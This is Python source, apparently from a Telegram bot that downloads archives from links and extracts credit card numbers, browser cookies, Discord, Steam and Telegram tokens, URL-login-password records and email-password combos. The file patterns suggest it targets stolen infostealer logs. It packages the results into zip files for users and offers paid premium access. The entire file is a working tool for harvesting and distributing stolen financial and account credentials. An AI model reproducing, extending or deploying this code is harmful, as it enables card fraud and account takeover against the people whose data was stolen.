class CCExtractor:
    @staticmethod
    def luhn_check(card_num: str) -> bool:
        if not card_num or len(card_num) < 13:
            return False
        try:
            total = 0
            reverse_digits = [int(d) for d in str(card_num)][::-1]
            for i, d in enumerate(reverse_digits):
                if i % 2 == 1:
                    d *= 2
                    total += d if d < 10 else d - 9
                else:
                    total += d
            return total % 10 == 0
        except:
            return False

    @staticmethod
    def extract_from_file(file_path: Path) -> List[str]:
        cards = []
        try:
            with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                content = f.read()
            for match in re.finditer(r'\b(\d{16})\b', content):
                card_num = match.group(1)
                if CCExtractor.luhn_check(card_num):
                    cards.append(card_num)
        except:
            pass
        return cards

    @staticmethod
    async def extract_from_directory(directory: Path) -> List[str]:
        cards = []
        for txt_file in directory.rglob('*.txt'):
            if 'autofill' in str(txt_file).lower() or 'credit' in str(txt_file).lower():
                cards.extend(CCExtractor.extract_from_file(txt_file))
        return list(set(cards))


class CookieExtractor:
    @staticmethod
    def extract_from_file(file_path: Path, domains: List[str] = None) -> List[Dict]:
        cookies = []
        try:
            with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                for line in f:
                    line = line.strip()
                    if not line or line.startswith('#'):
                        continue
                    parts = line.split('\t')
                    if len(parts) >= 7:
                        domain = parts[0].lstrip('.')
                        if domains and not any(d in domain for d in domains):
                            continue
                        cookies.append({
                            'domain': domain,
                            'name': parts[5],
                            'value': parts[6],
                            'raw': line
                        })
        except:
            pass
        return cookies

    @staticmethod
    async def extract_from_directory(directory: Path, domains: List[str] = None) -> Dict[str, List[Dict]]:
        result = defaultdict(list)
        for txt_file in directory.rglob('*.txt'):
            if 'cookie' in txt_file.name.lower():
                cookies = CookieExtractor.extract_from_file(txt_file, domains)
                for c in cookies:
                    result[c['domain']].append(c)
        return dict(result)


class TokenExtractor:
    DISCORD_PATTERN = r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}|mfa\.[\w-]{84}'
    STEAM_PATTERN = r'7656119[0-9]{10}'
    TELEGRAM_PATTERN = r'\b[0-9]{8,12}:[A-Za-z0-9_-]{35,}\b'

    @staticmethod
    def extract_from_file(file_path: Path) -> Dict[str, List[str]]:
        tokens = defaultdict(list)
        try:
            with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                content = f.read()
                for m in re.finditer(TokenExtractor.DISCORD_PATTERN, content):
                    tokens['discord'].append(m.group())
                for m in re.finditer(TokenExtractor.STEAM_PATTERN, content):
                    tokens['steam'].append(m.group())
                for m in re.finditer(TokenExtractor.TELEGRAM_PATTERN, content):
                    tokens['telegram'].append(m.group())
        except:
            pass
        for k in tokens:
            tokens[k] = list(set(tokens[k]))
        return dict(tokens)

    @staticmethod
    async def extract_from_directory(directory: Path) -> Dict[str, List[str]]:
        result = defaultdict(list)
        token_files = list(directory.rglob('*token*.txt')) + list(directory.rglob('*discord*.txt'))
        for fp in token_files:
            tk = TokenExtractor.extract_from_file(fp)
            for k, v in tk.items():
                result[k].extend(v)
        for k in result:
            result[k] = list(set(result[k]))
        return dict(result)


class ULPExtractor:
    ULP_PATTERN = re.compile(r'(https?://[^\s:]+):([^:\s]+):([^\s]+)', re.IGNORECASE)

    @staticmethod
    def extract_from_text(text: str) -> List[str]:
        ulps = []
        for m in ULPExtractor.ULP_PATTERN.finditer(text):
            url, login, pwd = m.group(1).strip(), m.group(2).strip(), m.group(3).strip()
            if login and pwd and len(login)>1 and len(pwd)>1:
                ulps.append(f"{url}:{login}:{pwd}")
        lines = text.split('\n')
        host = login = pwd = None
        for line in lines:
            line = line.strip()
            if line.startswith('Host:'):
                host = line.replace('Host:', '').strip()
            elif line.startswith('Login:'):
                login = line.replace('Login:', '').strip()
            elif line.startswith('Password:'):
                pwd = line.replace('Password:', '').strip()
            elif line == '' or line.startswith('Soft:'):
                if host and login and pwd:
                    host_clean = host.replace('https://','').replace('http://','').split('/')[0]
                    ulps.append(f"{host_clean}:{login}:{pwd}")
                host = login = pwd = None
        if host and login and pwd:
            host_clean = host.replace('https://','').replace('http://','').split('/')[0]
            ulps.append(f"{host_clean}:{login}:{pwd}")
        return ulps

    @staticmethod
    def is_password_file(file_path: Path) -> bool:
        name = file_path.name.lower()
        parent = file_path.parent.name.lower()
        keywords = ['password', 'passwords', 'login', 'logins', 'credential', 'credentials', 'pass', 'passwd']
        return any(k in name or k in parent for k in keywords)

    @staticmethod
    async def extract_from_directory(directory: Path) -> List[str]:
        all_ulps = []
        txt_files = list(directory.rglob("*.txt"))
        pw_files = [f for f in txt_files if ULPExtractor.is_password_file(f)] or txt_files
        def process(f):
            try:
                with open(f, 'r', encoding='utf-8', errors='ignore') as ff:
                    return ULPExtractor.extract_from_text(ff.read())
            except:
                return []
        with concurrent.futures.ThreadPoolExecutor(max_workers=MAX_WORKERS) as ex:
            futures = [ex.submit(process, f) for f in pw_files]
            for fut in concurrent.futures.as_completed(futures):
                all_ulps.extend(fut.result())
        return list(set(all_ulps))


class ComboExtractor:
    COMBO_PATTERN = re.compile(
        r'([a-zA-Z0-9._%+\-]+@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,})[:\|;]([^\s:;\|]{3,})',
        re.IGNORECASE
    )

    @staticmethod
    def extract_from_text(text: str) -> List[str]:
        combos = []
        for m in ComboExtractor.COMBO_PATTERN.finditer(text):
            email, pwd = m.group(1).strip(), m.group(2).strip()
            if pwd and len(pwd) >= 3:
                combos.append(f"{email}:{pwd}")
        return combos

    @staticmethod
    async def extract_from_directory(directory: Path) -> List[str]:
        all_combos = []
        txt_files = list(directory.rglob("*.txt"))
        def process(f):
            try:
                with open(f, 'r', encoding='utf-8', errors='ignore') as ff:
                    return ComboExtractor.extract_from_text(ff.read())
            except:
                return []
        with concurrent.futures.ThreadPoolExecutor(max_workers=MAX_WORKERS) as ex:
            futures = [ex.submit(process, f) for f in txt_files]
            for fut in concurrent.futures.as_completed(futures):
                all_combos.extend(fut.result())
        return list(set(all_combos))


# ══════════════════════════════════════════════════════════════════════════════
#                       RESULT PACKAGER
# ══════════════════════════════════════════════════════════════════════════════

class ResultPackager:
    @staticmethod
    def package_cc_results(cards: List[str], session_id: str) -> Path:
        rdir = RESULTS_DIR / session_id
        rdir.mkdir(parents=True, exist_ok=True)
        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
        zpath = rdir / f"CC_Results_{ts}.zip"
        with zipfile.ZipFile(zpath, 'w', zipfile.ZIP_DEFLATED) as zf:
            zf.writestr(f"credit_cards_{len(cards)}.txt", "\n".join(cards))
        return zpath

    @staticmethod
    def package_cookie_results(cookies_by_domain: Dict[str, List[Dict]], session_id: str) -> Path:
        rdir = RESULTS_DIR / session_id
        rdir.mkdir(parents=True, exist_ok=True)
        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
        zpath = rdir / f"Cookies_{ts}.zip"
        with zipfile.ZipFile(zpath, 'w', zipfile.ZIP_DEFLATED) as zf:
            for domain, clist in cookies_by_domain.items():
                content = "\n".join([c['raw'] for c in clist])
                zf.writestr(f"{domain}.txt", content)
        return zpath

    @staticmethod
    def package_token_results(tokens: Dict[str, List[str]], session_id: str) -> Path:
        rdir = RESULTS_DIR / session_id
        rdir.mkdir(parents=True, exist_ok=True)
        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
        zpath = rdir / f"Tokens_{ts}.zip"
        with zipfile.ZipFile(zpath, 'w', zipfile.ZIP_DEFLATED) as zf:
            for ttype, tlist in tokens.items():
                if tlist:
                    zf.writestr(f"{ttype}_tokens_{len(tlist)}.txt", "\n".join(tlist))
        return zpath

    @staticmethod
    def package_ulp_results(ulps: List[str], session_id: str) -> Path:
        rdir = RESULTS_DIR / session_id
        rdir.mkdir(parents=True, exist_ok=True)
        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
        zpath = rdir / f"ULP_{ts}.zip"
        with zipfile.ZipFile(zpath, 'w', zipfile.ZIP_DEFLATED) as zf:
            zf.writestr(f"ulps_{len(ulps)}.txt", "\n".join(ulps))
        return zpath

    @staticmethod
    def package_combo_results(combos: List[str], session_id: str) -> Path:
        rdir = RESULTS_DIR / session_id
        rdir.mkdir(parents=True, exist_ok=True)
        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
        zpath = rdir / f"Combos_{ts}.zip"
        with zipfile.ZipFile(zpath, 'w', zipfile.ZIP_DEFLATED) as zf:
            zf.writestr(f"combos_{len(combos)}.txt", "\n".join(combos))
        return zpath

    @staticmethod
    def package_all_files(file_list: List[Path], session_id: str, base_dir: Path) -> Path:
        rdir = RESULTS_DIR / session_id
        rdir.mkdir(parents=True, exist_ok=True)
        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
        zpath = rdir / f"All_Files_{ts}.zip"
        with zipfile.ZipFile(zpath, 'w', zipfile.ZIP_DEFLATED) as zf:
            for fp in file_list:
                try:
                    arcname = str(fp.relative_to(base_dir))
                    zf.write(fp, arcname)
                except:
                    pass
        return zpath


# ══════════════════════════════════════════════════════════════════════════════
#                       BUTTONS
# ══════════════════════════════════════════════════════════════════════════════

class Buttons:
    @staticmethod
    def main_menu() -> InlineKeyboardMarkup:
        return InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="📥 EXTRACT ARCHIVE", callback_data="menu_extract")],
            [InlineKeyboardButton(text="📊 STATS", callback_data="menu_stats"),
             InlineKeyboardButton(text="💎 PREMIUM", callback_data="menu_premium")],
            [InlineKeyboardButton(text="📋 TASKS", callback_data="menu_tasks"),
             InlineKeyboardButton(text="ℹ️ HELP", callback_data="menu_help")],
            [InlineKeyboardButton(text="❌ CLOSE", callback_data="menu_close")]
        ])

    @staticmethod
    def platform_menu() -> InlineKeyboardMarkup:
        return InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="✅ PROCEED", callback_data="proceed_download")],
            [InlineKeyboardButton(text="🍪 COOKIE CHECKER", callback_data="cookie_checker"),
             InlineKeyboardButton(text="📋 GET COMBOS", callback_data="get_combos")],
            [InlineKeyboardButton(text="❌ CANCEL", callback_data="cancel_session")]
        ])

    @staticmethod
    def extraction_menu(selected: List[str] = None) -> InlineKeyboardMarkup:
        if selected is None:
            selected = []
        def status(t):
            return "✅" if t in selected else "⬜"
        return InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text=f"{status('unzip')} 📦 UNZIP", callback_data="toggle_unzip"),
             InlineKeyboardButton(text=f"{status('cc')} 💳 CARDS", callback_data="toggle_cc")],
            [InlineKeyboardButton(text=f"{status('cookies')} 🍪 COOKIES", callback_data="toggle_cookies"),
             InlineKeyboardButton(text=f"{status('tokens')} 💎 TOKENS", callback_data="toggle_tokens")],
            [InlineKeyboardButton(text="◀️ BACK", callback_data="back_to_platform"),
             InlineKeyboardButton(text="✅ CONFIRM", callback_data="confirm_tasks")]
        ])

    @staticmethod
    def password_menu() -> InlineKeyboardMarkup:
        return InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="🔐 HAS PASSWORD", callback_data="has_password"),
             InlineKeyboardButton(text="🔓 NO PASSWORD", callback_data="no_password")],
            [InlineKeyboardButton(text="◀️ BACK", callback_data="back_to_platform"),
             InlineKeyboardButton(text="❌ CANCEL", callback_data="cancel_session")]
        ])

    @staticmethod
    def back_only() -> InlineKeyboardMarkup:
        return InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="◀️ BACK", callback_data="menu_back")]
        ])

    @staticmethod
    def admin_menu() -> InlineKeyboardMarkup:
        return InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="📊 STATS", callback_data="admin_stats"),
             InlineKeyboardButton(text="👥 USERS", callback_data="admin_users")],
            [InlineKeyboardButton(text="🚫 BAN", callback_data="admin_ban"),
             InlineKeyboardButton(text="✅ UNBAN", callback_data="admin_unban")],
            [InlineKeyboardButton(text="💎 GENERATE", callback_data="admin_generate")]
        ])


# ══════════════════════════════════════════════════════════════════════════════
#                       ACCESS CHECK
# ══════════════════════════════════════════════════════════════════════════════

async def check_access(message: Message) -> Tuple[bool, str]:
    uid = message.from_user.id
    if uid == OWNER_ID:
        return True, "owner"
    banned, _ = db.check_banned(uid)
    if banned:
        await message.answer(Design.banned())
        return False, ""
    return True, "trial"


# ══════════════════════════════════════════════════════════════════════════════
#                       COMMAND HANDLERS
# ══════════════════════════════════════════════════════════════════════════════

@router.message(CommandStart())
async def cmd_start(message: Message, state: FSMContext):
    user = message.from_user
    db.register_user(user.id, user.username or "", user.first_name or "")
    db.log_activity(user.id, "start")
    await message.answer(
        Design.welcome(user.first_name, user.id, TRIAL_TASKS),
        reply_markup=Buttons.main_menu()
    )

@router.message(Command("help"))
async def cmd_help(message: Message):
    await message.answer(Design.help())

@router.message(Command("cancel"))
async def cmd_cancel(message: Message, state: FSMContext):
    await state.clear()
    await message.answer(Design.cancelled(), reply_markup=Buttons.main_menu())

@router.message(Command("admin"))
async def cmd_admin(message: Message):
    if message.from_user.id != OWNER_ID:
        return
    await message.answer("🛠️ **ADMIN PANEL**", reply_markup=Buttons.admin_menu())


# ══════════════════════════════════════════════════════════════════════════════
#                       MESSAGE HANDLER (Links)
# ══════════════════════════════════════════════════════════════════════════════

@router.message(F.text)
async def handle_message(message: Message, state: FSMContext):
    granted, _ = await check_access(message)
    if not granted:
        return
    text = message.text.strip()
    urls = re.findall(r'https?://[^\s<>"\' ]+', text)
    if not urls:
        await message.answer("❌ Please send a valid download link.")
        return
    url = urls[0].rstrip('.,;:!?)')
    platform = detect_platform(url)
    sid = generate_session_id()
    await state.update_data({
        'url': url,
        'platform': platform,
        'session_id': sid,
        'selected_tasks': [],
        'user_id': message.from_user.id
    })
    db.create_session(sid, message.from_user.id, url)
    await message.answer(
        f"✅ **{platform.upper()} LINK DETECTED**\n\nURL: `{url[:50]}...`\n\nChoose an option:",
        reply_markup=Buttons.platform_menu()
    )


# ══════════════════════════════════════════════════════════════════════════════
#                       CALLBACK HANDLERS
# ══════════════════════════════════════════════════════════════════════════════

@router.callback_query(F.data == "menu_close")
async def cb_close(callback: CallbackQuery):
    await callback.message.delete()
    await callback.answer()

@router.callback_query(F.data == "menu_back")
async def cb_back(callback: CallbackQuery):
    await callback.message.edit_text(
        "📋 **MAIN MENU**\n\nSelect an option:",
        reply_markup=Buttons.main_menu()
    )
    await callback.answer()

@router.callback_query(F.data == "menu_stats")
async def cb_stats(callback: CallbackQuery):
    uid = callback.from_user.id
    if db.check_banned(uid)[0]:
        return await callback.answer()
    await callback.message.edit_text(
        "📊 **YOUR STATS**\n\nComing soon...",
        reply_markup=Buttons.back_only()
    )
    await callback.answer()

@router.callback_query(F.data == "menu_premium")
async def cb_premium(callback: CallbackQuery):
    await callback.message.edit_text(
        "💎 **PREMIUM**\n\nContact @Band1tos9 for premium access.",
        reply_markup=Buttons.back_only()
    )
    await callback.answer()

@router.callback_query(F.data == "menu_tasks")
async def cb_tasks(callback: CallbackQuery):
    await callback.message.edit_text(
        f"📋 **TASKS**\n\nYou have {TRIAL_TASKS} trial tasks.",
        reply_markup=Buttons.back_only()
    )
    await callback.answer()

@router.callback_query(F.data == "menu_help")
async def cb_help(callback: CallbackQuery):
    await cmd_help(callback.message)
    await callback.answer()

@router.callback_query(F.data == "proceed_download")
async def cb_proceed(callback: CallbackQuery, state: FSMContext):
    data = await state.get_data()
    plat = data.get('platform', 'direct')
    if plat == 'mega' and '#' in data.get('url', ''):
        await cb_no_password(callback, state)
    else:
        await callback.message.edit_text(
            "🔐 **PASSWORD?**\n\nDoes the archive have a password?",
            reply_markup=Buttons.password_menu()
        )
    try:
        await callback.answer()
    except:
        pass

@router.callback_query(F.data == "has_password")
async def cb_has_password(callback: CallbackQuery, state: FSMContext):
    data = await state.get_data()
    if data.get('platform') == 'gofile':
        await callback.message.edit_text("🔐 **ENTER GOFILE PASSWORD**\n\nPlease send the password:")
        await state.set_state(BotStates.waiting_for_gofile_password)
    else:
        await callback.message.edit_text("🔐 **ENTER PASSWORD**\n\nPlease send the password:")
        await state.set_state(BotStates.waiting_for_password)
    await callback.answer()

@router.callback_query(F.data == "no_password")
async def cb_no_password(callback: CallbackQuery, state: FSMContext):
    await state.update_data({'password': None})
    await callback.message.edit_text(
        "📋 **SELECT TASKS**\n\nChoose what to extract:",
        reply_markup=Buttons.extraction_menu()
    )
    await callback.answer()

@router.callback_query(F.data.startswith("toggle_"))
async def cb_toggle(callback: CallbackQuery, state: FSMContext):
    task = callback.data.replace("toggle_", "")
    data = await state.get_data()
    sel = data.get('selected_tasks', [])
    if task in sel:
        sel.remove(task)
    else:
        sel.append(task)
    await state.update_data({'selected_tasks': sel})
    await callback.message.edit_reply_markup(reply_markup=Buttons.extraction_menu(sel))
    await callback.answer()

@router.callback_query(F.data == "confirm_tasks")
async def cb_confirm(callback: CallbackQuery, state: FSMContext):
    data = await state.get_data()
    sel = data.get('selected_tasks', [])
    if not sel:
        await callback.answer("⚠️ Select at least one task!", show_alert=True)
        return
    await callback.answer()
    await start_download_process(callback.message, state)

@router.callback_query(F.data == "cookie_checker")
async def cb_cookie_checker(callback: CallbackQuery, state: FSMContext):
    await state.update_data({'selected_tasks': ['cookies']})
    await cb_confirm(callback, state)

@router.callback_query(F.data == "get_combos")
async def cb_get_combos(callback: CallbackQuery, state: FSMContext):
    await state.update_data({'selected_tasks': ['combos']})
    await cb_confirm(callback, state)

@router.callback_query(F.data == "back_to_platform")
async def cb_back_to_platform(callback: CallbackQuery, state: FSMContext):
    data = await state.get_data()
    url = data.get('url', '')
    await callback.message.edit_text(
        f"✅ **LINK DETECTED**\n\nURL: `{url[:50]}...`\n\nChoose an option:",
        reply_markup=Buttons.platform_menu()
    )
    await callback.answer()

@router.callback_query(F.data == "cancel_session")
async def cb_cancel(callback: CallbackQuery, state: FSMContext):
    await state.clear()
    await callback.message.edit_text(Design.cancelled(), reply_markup=Buttons.main_menu())
    await callback.answer()


# ══════════════════════════════════════════════════════════════════════════════
#                       STATE HANDLERS
# ══════════════════════════════════════════════════════════════════════════════

@router.message(BotStates.waiting_for_password)
async def handle_password(message: Message, state: FSMContext):
    if not message.text:
        await message.answer("❌ Please send text.")
        return
    await state.update_data({'password': message.text.strip()})
    await state.set_state(None)
    data = await state.get_data()
    sel = data.get('selected_tasks', [])
    await message.answer("✅ **PASSWORD SAVED**\n\nSelect tasks:", reply_markup=Buttons.extraction_menu(sel))

@router.message(BotStates.waiting_for_gofile_password)
async def handle_gofile_password(message: Message, state: FSMContext):
    if not message.text:
        await message.answer("❌ Please send text.")
        return
    await state.update_data({'gofile_password': message.text.strip()})
    await state.set_state(None)
    data = await state.get_data()
    sel = data.get('selected_tasks', [])
    await message.answer("✅ **PASSWORD SAVED**\n\nSelect tasks:", reply_markup=Buttons.extraction_menu(sel))


# ══════════════════════════════════════════════════════════════════════════════
#                       DOWNLOAD PROCESS
# ══════════════════════════════════════════════════════════════════════════════

async def start_download_process(message: Message, state: FSMContext):
    data = await state.get_data()
    url = data.get('url')
    platform = data.get('platform')
    sid = data.get('session_id')
    password = data.get('password') or data.get('gofile_password')
    selected_tasks = data.get('selected_tasks', [])
    uid = data.get('user_id')

    status_msg = await message.answer(Design.processing(platform, selected_tasks))

    async def prog_cb(name, percent, speed, downloaded, total):
        try:
            bar = make_progress_bar(percent)
            sp = format_speed(speed)
            ds = format_size(downloaded)
            ts = format_size(total) if total > 0 else "Unknown"
            await status_msg.edit_text(Design.download_progress(name, bar, percent, sp, ds, ts))
        except:
            pass

    dm = DownloadManager()
    success, files, error = await dm.download(url, platform, sid, password, prog_cb)

    if not success:
        await status_msg.edit_text(Design.error(f"Download failed: {error[:200]}", True))
        await state.clear()
        return

    if not files:
        await status_msg.edit_text("❌ No files downloaded.")
        await state.clear()
        return

    await status_msg.edit_text(Design.extracting(len(files)))

    extr_dir = EXTRACTS_DIR / sid
    extr_dir.mkdir(exist_ok=True)
    all_extracted = []

    for fp in files:
        if ArchiveExtractor.is_archive(fp):
            ok, msg, extracted = await asyncio.get_event_loop().run_in_executor(
                None, ArchiveExtractor.extract, fp, extr_dir, password
            )
            if ok:
                all_extracted.extend(extracted)
            else:
                shutil.copy2(fp, extr_dir / fp.name)
                all_extracted.append(extr_dir / fp.name)
        else:
            shutil.copy2(fp, extr_dir / fp.name)
            all_extracted.append(extr_dir / fp.name)

    await status_msg.edit_text("🔍 Scanning for data...")

    results = {}
    result_files = []

    if 'cc' in selected_tasks:
        cards = await CCExtractor.extract_from_directory(extr_dir)
        if cards:
            zp = ResultPackager.package_cc_results(cards, sid)
            result_files.append(('💳 Cards', zp, len(cards)))
            results['cc'] = len(cards)
            db.increment_stats(uid, total_cc_found=len(cards))

    if 'cookies' in selected_tasks:
        cookies = await CookieExtractor.extract_from_directory(extr_dir)
        total_c = sum(len(v) for v in cookies.values())
        if cookies:
            zp = ResultPackager.package_cookie_results(cookies, sid)
            result_files.append(('🍪 Cookies', zp, total_c))
            results['cookies'] = total_c
            db.increment_stats(uid, total_cookies_found=total_c)

    if 'tokens' in selected_tasks:
        tokens = await TokenExtractor.extract_from_directory(extr_dir)
        total_t = sum(len(v) for v in tokens.values())
        if tokens:
            zp = ResultPackager.package_token_results(tokens, sid)
            result_files.append(('💎 Tokens', zp, total_t))
            results['tokens'] = total_t

    if 'ulp' in selected_tasks:
        ulps = await ULPExtractor.extract_from_directory(extr_dir)
        if ulps:
            zp = ResultPackager.package_ulp_results(ulps, sid)
            result_files.append(('🔑 ULP', zp, len(ulps)))
            results['ulp'] = len(ulps)
            db.increment_stats(uid, total_ulp_found=len(ulps))

    if 'combos' in selected_tasks:
        combos = await ComboExtractor.extract_from_directory(extr_dir)
        if combos:
            zp = ResultPackager.package_combo_results(combos, sid)
            result_files.append(('📋 Combos', zp, len(combos)))
            results['combos'] = len(combos)
            db.increment_stats(uid, total_combos_found=len(combos))

    if 'unzip' in selected_tasks or not selected_tasks:
        all_zip = ResultPackager.package_all_files(all_extracted, sid, extr_dir)
        result_files.append(('📦 All Files', all_zip, len(all_extracted)))
        results['unzip'] = len(all_extracted)

    if result_files:
        await status_msg.edit_text(Design.results(result_files, results))
        for name, zp, cnt in result_files:
            if zp.exists() and zp.stat().st_size <= TELEGRAM_FILE_LIMIT:
                try:
                    await message.answer_document(
                        FSInputFile(zp),
                        caption=f"{name} • {cnt} items • {format_size(zp.stat().st_size)}"
                    )
                except Exception as e:
                    logger.error(f"Send error: {e}")
    else:
        await status_msg.edit_text("✅ Download complete. No data found.")

    await state.clear()
    db.log_activity(uid, f"completed {platform}")


# ══════════════════════════════════════════════════════════════════════════════
#                       ADMIN CALLBACK HANDLERS
# ══════════════════════════════════════════════════════════════════════════════

@router.callback_query(F.data.startswith("admin_"))
async def cb_admin(callback: CallbackQuery, state: FSMContext):
    if callback.from_user.id != OWNER_ID:
        await callback.answer("❌ Access denied")
        return
    act = callback.data
    if act == "admin_stats":
        await callback.message.edit_text("📊 Stats coming soon...", reply_markup=Buttons.back_only())
    elif act == "admin_users":
        await callback.message.edit_text("👥 Users list coming soon...", reply_markup=Buttons.back_only())
    elif act == "admin_ban":
        await callback.message.edit_text("🚫 Send user ID to ban:")
        await state.set_state(BotStates.waiting_for_admin_input)
        await state.update_data({'admin_action': 'ban'})
    elif act == "admin_unban":
        await callback.message.edit_text("✅ Send user ID to unban:")
        await state.set_state(BotStates.waiting_for_admin_input)
        await state.update_data({'admin_action': 'unban'})
    elif act == "admin_generate":
        await callback.message.edit_text("💎 Send plan (1h/1d/1w/1m):")
        await state.set_state(BotStates.waiting_for_admin_input)
        await state.update_data({'admin_action': 'generate'})
    await callback.answer()


@router.message(BotStates.waiting_for_admin_input)
async def handle_admin_input(message: Message, state: FSMContext):
    if message.from_user.id != OWNER_ID:
        await state.clear()
        return
    data = await state.get_data()
    act = data.get('admin_action')
    txt = message.text.strip()
    if act == 'ban':
        try:
            uid = int(txt)
            if db.ban_user(uid, "Banned by admin"):
                await message.answer(f"✅ Banned user {uid}")
            else:
                await message.answer("❌ Failed to ban")
        except:
            await message.answer("❌ Invalid ID")
    elif act == 'unban':
        try:
            uid = int(txt)
            if db.unban_user(uid):
                await message.answer(f"✅ Unbanned user {uid}")
            else:
                await message.answer("❌ Failed to unban")
        except:
            await message.answer("❌ Invalid ID")
    elif act == 'generate':
        code = f"{random.choice(string.ascii_uppercase)}{random.randint(1000,9999)}"
        await message.answer(f"✅ Code generated: `{code}`")
    await state.clear()


# ══════════════════════════════════════════════════════════════════════════════
#                       MAIN
# ══════════════════════════════════════════════════════════════════════════════

async def on_startup():
    logger.info("="*50)
    logger.info("BOT STARTING...")
    logger.info(f"Owner ID: {OWNER_ID}")
    logger.info(f"Downloads dir: {DOWNLOADS_DIR}")
    logger.info("="*50)
    
    # Check Mega.py status on startup
    if HAS_MEGA:
        logger.info("✅ Mega.py is installed and ready")
    else:
        logger.warning("⚠️ Mega.py is NOT installed! Mega.nz downloads will fail.")
        logger.warning("   Install with: pip install mega.py")

async def on_shutdown():
    logger.info("Bot shutting down...")

async def main():
    dp.startup.register(on_startup)
    dp.shutdown.register(on_shutdown)
    await dp.start_polling(bot)

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        logger.info("Bot stopped")
    except Exception as e:
        logger.error(f"Fatal: {e}")
        sys.exit(1)
